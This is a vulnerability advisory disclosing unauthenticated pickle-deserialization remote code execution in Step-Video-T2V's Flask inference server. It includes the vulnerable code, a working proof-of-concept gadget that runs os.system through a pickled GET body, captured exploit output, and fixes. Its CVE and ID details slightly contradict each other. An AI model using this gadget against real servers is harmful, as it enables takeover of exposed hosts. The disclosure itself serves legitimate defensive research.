# VDR-011: Unauthenticated Pickle Deserialization RCE in stepfun-ai/Step-Video-T2V

- **Target**: [stepfun-ai/Step-Video-T2V](https://github.com/stepfun-ai/Step-Video-T2V)
- **Severity**: Critical (CVSS 3.1: 9.8)
- **CWE**: [CWE-502](https://cwe.mitre.org/data/definitions/502.html) - Deserialization of Untrusted Data
- **CVE**: [CVE-2026-51097](https://www.cve.org/CVERecord?id=CVE-2026-51097)
- **CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **Discovered**: 2026-06-05
- **Researcher**: Dennis Sepede - [Securitix Solutions](https://securitixsolutions.com)

## Summary

The distributed inference remote server shipped with Step-Video-T2V
(`api/call_remote_server.py`, at the latest commit `675e08c`, 2025-03-17)
deserializes the raw body of incoming HTTP requests with `pickle.loads()` in two
network-exposed flask-restful resources, `/vae-api` and `/caption-api`. The
server binds `host="0.0.0.0"` on port `8080` and enforces **no authentication**.
Because Python's `pickle` executes arbitrary code during deserialization, any
attacker who can reach the port can send a crafted pickle object and obtain
**unauthenticated remote code execution** as the user running the inference
server, which is documented to run on multi-GPU hosts.

## Affected Component

- `api/call_remote_server.py:66` - `VAEapi.get()` (resource mapped to `/vae-api`) invoking `pickle.loads(request.get_data())` on the raw request body
- `api/call_remote_server.py:129` - `Captionapi.get()` (resource mapped to `/caption-api`) invoking `pickle.loads(request.get_data())` on the raw request body

Both sinks are identical and equally exploitable.

## Details

### Source -> sink

The server defines two flask-restful `Resource` classes. Each `get()` handler
reads the raw HTTP request body and deserializes it with `pickle`:

`api/call_remote_server.py` (lines 59-77, VAE resource):

```python
lock = threading.Lock()
class VAEapi(Resource):
    def __init__(self, vae_pipeline):
        self.vae_pipeline = vae_pipeline

    def get(self):
        with lock:
            try:
                feature = pickle.loads(request.get_data())   # <-- line 66, SINK
                feature['api'] = 'vae'

                feature = {k:v for k, v in feature.items() if v is not None}
                video_latents = self.vae_pipeline.decode(**feature)
                response = pickle.dumps(video_latents)
            except Exception as e:
                print("Caught Exception: ", e)
                return Response(e)
            return Response(response)
```

`api/call_remote_server.py` (lines 121-140, Caption resource) is the same
pattern with the sink at **line 129**.

The resources are registered and the app is bound to all interfaces, with no
authentication layer of any kind:

`api/call_remote_server.py` (lines 145-179):

```python
class RemoteServer(object):
    def __init__(self, args) -> None:
        self.app = Flask(__name__)
        ...
        api = Api(self.app)
        ...
        api.add_resource(VAEapi, "/vae-api", resource_class_args=[self.vae_pipeline])
        ...
        api.add_resource(Captionapi, "/caption-api", resource_class_args=[self.caption_pipeline])

    def run(self, host="0.0.0.0", port=8080):
        self.app.run(host, port=port, threaded=True, debug=False)

if __name__ == "__main__":
    args = parsed_args()
    flask_server = RemoteServer(args)
    flask_server.run(host="0.0.0.0", port=args.port)   # default port 8080
```

`request.get_data()` returns the unmodified raw HTTP request body, fully
attacker-controlled, with no schema or signature validation before it reaches
`pickle.loads()`.

### Network reachability and intended exposure

This is not an internal-only helper. The project's own `README.md` (line 131)
instructs operators to launch this exact process as a network service:

```
python api/call_remote_server.py --model_dir where_you_download_dir &
## ... This command will return the URL for both the caption API and the VAE API.
```

The legitimate client confirms the wire protocol the server expects -
`stepvideo/diffusion/video_pipeline.py` (lines 18-43):

```python
def call_api_gen(url, api, port=8080):
    url = f"http://{url}:{port}/{api}-api"
    ...
    data = {"samples": samples}            # (or {"prompts": ...} for caption)
    async with aiohttp.ClientSession() as sess:
        data_bytes = pickle.dumps(data)
        async with sess.get(url, data=data_bytes, timeout=12000) as response:
            ...
```

The client sends a **GET request whose body is a pickle stream**; the server
reads that body via `request.get_data()` and deserializes it. An attacker simply
replaces the benign `{"samples": ...}` dict with a malicious object.

### Gadget mechanics

Python `pickle` invokes an object's `__reduce__` during unpickling and calls the
returned callable with the returned arguments. A minimal exploit object whose
`__reduce__` returns `(os.system, ("<command>",))` therefore executes
`os.system("<command>")` the moment the server runs `pickle.loads()` on the
request body - before the handler ever inspects the deserialized value. No
gadget chain in third-party libraries is required; the standard library suffices.

## Proof of Concept

> **Reproduction method - faithful minimal harness.** To avoid downloading the
> multi-gigabyte model weights and a GPU/torch stack, the PoC copies the
> **verbatim** vulnerable route logic from `api/call_remote_server.py` (the
> `VAEapi` / `Captionapi` resources with `feature = pickle.loads(request.get_data())`
> and the identical `api.add_resource(..., "/vae-api")` / `"/caption-api"` wiring)
> into a standalone Flask app, with the model pipelines replaced by inert stubs
> that are never reached with attacker input. The deserialization sink and the
> flask-restful routing are byte-for-byte identical to the shipped code. The
> source trace above proves the same code path executes in the real application.
> The harness binds `127.0.0.1:18801` so the PoC does not expose a live RCE
> listener on the network; the upstream `0.0.0.0` / no-auth exposure is
> established from the source, not re-proven by opening a LAN port.

### Steps

1. `python -m venv venv && venv\Scripts\pip install flask flask-restful requests`
   (verified versions: flask 3.1.3, flask-restful 0.3.10, requests 2.34.2, werkzeug 3.1.8; Python 3.12.10)
2. Start the harness reproducing the sink: `python poc/harness_server.py` (listens on `127.0.0.1:18801`, routes `/vae-api` and `/caption-api`).
3. Run the exploit client: `python poc/exploit_client.py`. It builds a pickle whose `__reduce__` returns `(os.system, (cmd,))`, where `cmd` writes the sentinel token `PWNED-STEPVIDEO-VDR-004` and the output of `whoami` to a temp file, then sends it as the **body of a GET** to `/vae-api` (mirroring the real client).
   (`python poc/run.py` automates steps 2-3 in one process.)

### Payload (gadget)

```python
class RCEGadget:
    def __reduce__(self):
        return (os.system, ('echo PWNED-STEPVIDEO-VDR-004 > sentinel & whoami >> sentinel',))

payload = pickle.dumps(RCEGadget())
requests.get("http://<host>:8080/vae-api", data=payload)   # GET with pickle body
```

### Real observed output (captured, `poc/OUTPUT.txt`)

```
127.0.0.1 - - [05/Jun/2026 10:47:46] "GET /vae-api HTTP/1.1" 500 -
Caught Exception:  'int' object does not support item assignment
[exploit] HTTP status : 500
[exploit] >>> SENTINEL FILE PRESENT - RCE CONFIRMED <<<
[exploit] sentinel contents of C:\Users\Dennis\AppData\Local\Temp\vdr004_stepvideo_pwned.txt:
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
PWNED-STEPVIDEO-VDR-004
Dennis
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
[exploit] sentinel token 'PWNED-STEPVIDEO-VDR-004' verified in file.
```

**Interpretation.** The OS command executed (the sentinel file was created by the
server process and contains `whoami` output `Dennis`), which proves arbitrary
code execution. The subsequent HTTP 500 / `'int' object does not support item
assignment` is expected and actually localizes the bug precisely: `pickle.loads()`
already ran the attacker's `os.system()` and returned its integer exit code
before the next line `feature['api'] = 'vae'` tried to subscript that integer.
Code execution occurs at the `pickle.loads()` sink, independent of the downstream
model logic - so the absence of the real ML model does not affect exploitability.

## Impact

Unauthenticated remote code execution as the user running the inference server.
Step-Video-T2V is documented to run on multi-GPU hosts; compromise of such a node
yields control of expensive accelerator hardware, theft or tampering of model
weights and prompts/outputs, use of the host for lateral movement into the
training/inference cluster, cryptomining, or destruction of data. Because the
service is intended to listen on the network (`0.0.0.0:8080`) and returns its URL
for clients to connect, any operator following the official multi-GPU deployment
instructions on a reachable network exposes a full RCE surface to that network.

## Recommendation

- **Do not use `pickle` for network input.** Replace the wire format with a safe,
  schema-validated serialization such as JSON or msgpack (with numeric arrays
  encoded explicitly, e.g. safetensors / raw little-endian buffers with shape and
  dtype metadata). Never call `pickle.loads()` on data that crossed a trust
  boundary.
- **Add authentication** (a strong shared secret / mTLS) between the inference
  client and the caption/VAE servers, and reject unauthenticated requests.
- **Bind to localhost by default** (`127.0.0.1`) and require explicit operator
  opt-in plus network controls (firewall / private subnet / VPN) for any
  multi-host deployment; never default to `0.0.0.0`.
- As defense in depth, run the server as an unprivileged, sandboxed user with no
  outbound network and minimal filesystem access.

## Status

| Date | Event |
|------|-------|
| 2026-06-05 | Vulnerability discovered during source code audit |
| 2026-06-05 | Working PoC confirmed |
| TBD | CVE request submitted to MITRE CNA-LR |

## References

- [CWE-502](https://cwe.mitre.org/data/definitions/502.html)
- [Upstream repository](https://github.com/stepfun-ai/Step-Video-T2V)
